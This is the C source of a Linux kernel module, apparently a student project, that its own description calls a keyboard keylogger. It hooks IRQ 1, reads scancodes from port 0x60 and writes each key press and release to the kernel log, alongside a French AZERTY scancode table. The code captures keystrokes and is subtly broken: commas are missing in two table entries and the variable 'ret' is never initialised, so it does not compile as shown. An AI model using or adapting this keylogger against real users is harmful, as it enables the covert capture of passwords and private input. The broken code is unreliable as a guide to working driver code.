#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/io.h>
#include <linux/list.h>
#include <linux/mutex.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("mberengu");
MODULE_DESCRIPTION("keyboard keylogger driver");

// dmesg | grep -i irq  => [    0.539481] serio: i8042 KBD port at 0x60,0x64 irq 1
#define IRQ_NUM 1
#define IRQ_NAME "Keylogger"
#define KEYBOARD_PORT 0x60
#define RELEASED_MASK 0x80

// id for irq interrupt
static void *dev_id = "Keylogger";

static void keyboard_tasklet(struct tasklet_struct *tasklet);
DECLARE_TASKLET(kbd_tasklet, keyboard_tasklet);

struct keycodes_s {
	char		key[15];
	char		maj[2];
	char		variation[4];
	unsigned char	pressed;
	unsigned char	released;
};

static struct keycodes_s	keycodes[] = {
	// CORE
	{"a", "A", "", 0x10, 0x90},
	{"b", "B", "", 0x30, 0xb0},
	{"c", "C", "", 0x2e, 0xae},
	{"d", "D", "", 0x20, 0xa0},
	{"e", "E", "€", 0x12, 0x92},
	{"f", "F", "", 0x21, 0xa1},
	{"g", "G", "", 0x22, 0xa2},
	{"h", "H", "", 0x23, 0xa3},
	{"i", "I", "", 0x17, 0x97},
	{"j", "J", "", 0x24, 0xa4},
	{"k", "K", "", 0x25, 0xa5},
	{"l", "L", "", 0x26, 0xa6},
	{"m", "M", "", 0x27, 0xa7},
	{"n", "N", "", 0x31, 0xb1},
	{"o", "O", "", 0x18, 0x98},
	{"p", "P", "", 0x19, 0x99},
	{"q", "Q", "", 0x1e, 0x9e},
	{"r", "R", "", 0x13, 0x93},
	{"s", "S", "", 0x1f, 0x9f},
	{"t", "T", "", 0x14, 0x94},
	{"u", "U", "", 0x16, 0x96},
	{"v", "V", "", 0x2f, 0xaf},
	{"w", "W", "", 0x2c, 0xac},
	{"x", "X", "", 0x2d, 0xad},
	{"y", "Y", "", 0x15, 0x95},
	{"z", "Z", "", 0x11, 0x91},
	{"^", "¨", "", 0x1a, 0x9a},
	{"$", "£", "¤", 0x1b, 0x9b},
	{"ù", "%", "", 0x28, 0xa8},
	{",", "?", "", 0x32, 0xb2},
	{";", ".", "", 0x33, 0xb3},
	{":", "/", "", 0x34, 0xb4},
	{"!", "§", "", 0x35, 0xb5},

	// NUMBERS
	{"&", "1", "", 0x02, 0x82},
	{"é", "2", "~", 0x03, 0x83},
	{"\"", "3", "#", 0x04 0x84},
	{"'", "4", "{", 0x05, 0x85},
	{"(", "5", "[", 0x06, 0x86},
	{"-", "6", "|", 0x07, 0x87},
	{"è", "7", "`", 0x08, 0x88},
	{"_", "8", "\\", 0x09, 0x89},
	{"ç", "9", "^", 0x0a, 0x8a},
	{"à", "0", "@", 0x0b, 0x8b},
	{")", "°", "]", 0x0c, 0x8c},
	{"=", "+", "}", 0x0d, 0x8d},
	
	// PAD - NUMBERS
/*	{"0", "", "", 0x00, 0x00},
	{"1", "", "", 0x00, 0x00},
	{"2", "", "", 0x00, 0x00},
	{"3", "", "", 0x00, 0x00},
	{"4", "", "", 0x00, 0x00},
	{"5", "", "", 0x00, 0x00},
	{"6", "", "", 0x00, 0x00},
	{"7", "", "", 0x00, 0x00},
	{"8", "", "", 0x00, 0x00},
	{"9", "", "", 0x00, 0x00}, */

	// OTHER
	{"echap", "", "", 0x01, 0x81},
	//fX
	{"f1", "", "", 0x3b, 0xbb},
	{"f2", "", "", 0x3c, 0xbc},
	{"f3", "", "", 0x3d, 0xbd},
	{"f4", "", "", 0x3e, 0xbe},
	{"f5", "", "", 0x3f, 0xbf},
	{"f6", "", "", 0x40, 0xc0},
	{"f7", "", "", 0x41, 0xc1},
	{"f8", "", "", 0x42, 0xc2},
	{"f9", "", "", 0x43, 0xc3},
	{"f10", "", "", 0x44, 0xc4},
	{"f11", "", "", 0x57, 0xd7},
	{"f12", "", "", 0x58, 0xd8},
	// left side special
	{"²", "", "", 0x01, 0x81},
	{"tab", "", "", 0x0f, 0x8f},
	{"caps up", "", "", 0x3a, 0xba}, // (fa -> ba)
	{"caps down", "", "", 0x3a, 0xfa}, // (ba -> fa)
	{"lshift", "", "", 0x2a, 0xaa},
	{"lctrl", "", "", 0x1d, 0x9d},
	//{"fn", "", "", 0x00, 0x00}, // no react
	{"alt", "", "", 0x38, 0xb8},
	// right side special
	{"backspace", "", "", 0x0e, 0x8e},
	{"*", "µ", "", 0x2b, 0xab},
	{"enter", "", "", 0x1c, 0x9c},
	{"rshift", "", "", 0x36, 0xb6},
	{"rctrl", "", "", 0xe0, 0x9d},
	{"window", "", "", 0x5c, 0xdc},	// released [e0]
					// pressed [38]
					// released [e0]
					// released [b8]

	{"alt-gr", "", "", 0x38, 0xb8},	// released [e0]
					// pressed [38]
					// released [e0]
					// released [b8]

	{"<", ">", "", 0x56, 0xd6},

	{"left arrow", "", "", 0x4b, 0xcb},	// released [e0]
						// pressed [4b]
						// released [e0]
						// released [cb]

	{"right arrow", "", "", 0x4d, 0xcd}	// released [e0]
						// pressed [4d]
						// released [e0]
						// released [cd] 

	{"up", "", "", 0x48, 0xc8},	// released [e0]
					// pressed [48]
					// released [e0]
					// released [c8]

	{"down", "", "", 0x50, 0xd0},	// released [e0]
					// pressed [51]
					// released [e0]
					// released [d1]

	{"inser", "", "", 0x52, 0xd2},	// released [e0]
					// pressed [52]
					// released [e0]
					// released [d2]

	{"home", "", "", 0x47, 0xc7},	// released [e0]
					// pressed [47]
					// released [e0]
					// released [c7]

	{"page up", "", "", 0x49, 0xc9},// released [e0]
					// pressed [49]
					// released [e0]
					// released [c9]

	{"suppr", "", "", 0x53, 0xd3},	// released [e0]
					// pressed [53]
					// released [e0]
					// released [d3]

	{"fin", "", "", 0x4f, 0xcf},	//released [e0]
					// pressed [4f]
					// released [e0]
					// released [cf]

	{"page down", "", "", 0x51, 0xd1},	// released [e0]
						// pressed [51]
						// released [e0]
						// released [d1]

	{"impr", "", "", 0x37, 0xb7},	// released [e0]
					// pressed [2a]
					// released [e0]
					// pressed [37]
					// released [e0]
					// released [b7]
					// released [e0]
					// released [aa]

	{"arret defil", "", "", 0x46, 0xc6},
	{"pause attn", "", "", 0x45, 0xc5}, // release	0xe1
					    // press	0x45
					    // release	0xe1
					    // release	0x9d
					    // release	0xc5
};

static void keyboard_tasklet(struct tasklet_struct *tasklet)
{
	unsigned char scancode;

	scancode = inb(KEYBOARD_PORT);
	unsigned char state = (scancode & RELEASED_MASK) ? 1 : 0;

	if (state)
	{
		pr_info("touche released [%x]\n", scancode);
	}
	else
	{
		pr_info("touche pressed [%x]\n", scancode);
	}

}

static irqreturn_t keyboard_interrupt(int irq, void *dev_id)
{
	tasklet_schedule(&kbd_tasklet);

	return IRQ_HANDLED;
}

static int __init initialization(void)
{
	int ret;

	if (request_irq(IRQ_NUM,
			keyboard_interrupt,
			IRQF_SHARED,
			IRQ_NAME,
			dev_id))
	{
		pr_err("keylogger: could not register irq: %d\n", ret);
		return ret;
	}

	pr_info("Keylogger: irq registered\n");
	return 0;
}

static void __exit cleanup(void)
{
	free_irq(IRQ_NUM, dev_id);
	tasklet_kill(&kbd_tasklet);
	pr_info("keylogger: irq freed\n");
}

module_init(initialization);
module_exit(cleanup);

